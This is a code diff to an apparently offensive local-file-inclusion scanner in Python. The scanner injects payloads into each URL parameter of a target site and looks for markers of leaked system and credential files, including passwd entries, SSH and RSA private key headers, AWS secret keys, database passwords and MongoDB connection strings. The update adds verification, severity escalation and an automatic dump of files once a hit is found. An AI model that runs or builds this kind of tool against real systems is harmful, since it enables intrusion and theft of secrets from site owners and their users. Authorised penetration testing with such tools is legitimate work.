@@ -1,14 +1,15 @@
-"""lfi — LFI scanner with Probe (baseline, mutate, marker)"""
+"""lfi — LFI scanner on Probe v2: baseline + verify + auto-dump + escalate"""
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from core.probe import Probe
 from core.payloads import get
 
 MARKERS = [
-    "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:",
+    "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:", "sys:x:",
     "[fonts]", "[extensions]", "for 16-bit app support",
-    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "REMOTE_ADDR=",
-    "-----BEGIN", "AWS_ACCESS_KEY_ID", "DB_PASSWORD",
-    "localhost:3306", "127.0.0.1:6379",
+    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "REMOTE_ADDR=", "SERVER_SOFTWARE=",
+    "-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----",
+    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "DB_USER",
+    "SECRET_KEY", "localhost:3306", "127.0.0.1:6379", "mongodb://",
 ]
 
 
@@ -21,16 +22,13 @@ class Lfi:
         probe = Probe(session, logger)
         base = probe.baseline_probe(target)
         if not base:
-            print("[lfi] no baseline")
-            return {"findings": []}
+            print("[lfi] no baseline"); return {"findings": []}
         print(f"[lfi] baseline: {base['code']} {base['len']}b")
 
-        # base payloads from file
-        payloads = get("lfi", limit=200, mutate_by=0)
-        print(f"[lfi] {len(payloads)} payloads on params {list(params.keys())}")
+        payloads = get("lfi", limit=150, mutate_by=0)
+        print(f"[lfi] {len(payloads)} payloads on {list(params.keys())}")
 
         findings = []
-
         for name in params:
             print(f"\n[lfi] param '{name}'")
             for i, p in enumerate(payloads, 1):
@@ -38,19 +36,31 @@ class Lfi:
                     u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                 )
                 r = probe.inject(url_fn, p, detect_markers=MARKERS)
-                if r["hit"] and r["reason"].startswith("marker:"):
-                    print(f"  ✓ {r['reason']} — {p[:60]}")
-                    findings.append({
-                        "param": name,
-                        "payload": r["payload"],
-                        "marker": r["reason"].split(":", 1)[1],
-                    })
-                    logger.finding("lfi", "critical", f"{name}={p[:60]} ({r['reason']})")
-                elif i % 50 == 0:
-                    print(f"  · {i}/{len(payloads)} done, {len(findings)} hits")
+                if not r["hit"] or not r["reason"].startswith("marker:"):
+                    if i % 40 == 0:
+                        print(f"  · {i}/{len(payloads)}, {len(findings)} hits")
+                    continue
 
-        stats = probe.summary()
-        print(f"\n[lfi] total findings: {len(findings)}")
-        print(f"[lfi] stats: req={stats['requests']} blocks={stats['blocks']}")
+                # verify
+                verified = probe.verify(url_fn, p, detect_markers=MARKERS, times=2)
+                if not verified:
+                    print(f"  · unverified: {p[:50]}")
+                    continue
 
-        return {"findings": findings, "stats": stats}
+                marker = r["reason"].split(":", 1)[1]
+                sev = probe.escalate_severity("high", r,
+                       r.get("response").text if r.get("response") is not None else "")
+                print(f"  ✓ [{sev}] {name}={p[:60]} -> {marker}")
+                findings.append({
+                    "param": name, "payload": p, "marker": marker,
+                    "severity": sev, "verified": True,
+                })
+                logger.finding("lfi", sev, f"{name}={p[:60]} marker={marker}")
+
+                # auto-dump
+                probe.auto_dump({"kind": "lfi"}, target, name)
+                break  # one confirmed LFI per param is enough
+
+        print(f"\n[lfi] total: {len(findings)} verified")
+        print(f"[lfi] stats: {probe.summary()}")
+        return {"findings": findings, "stats": probe.summary()}
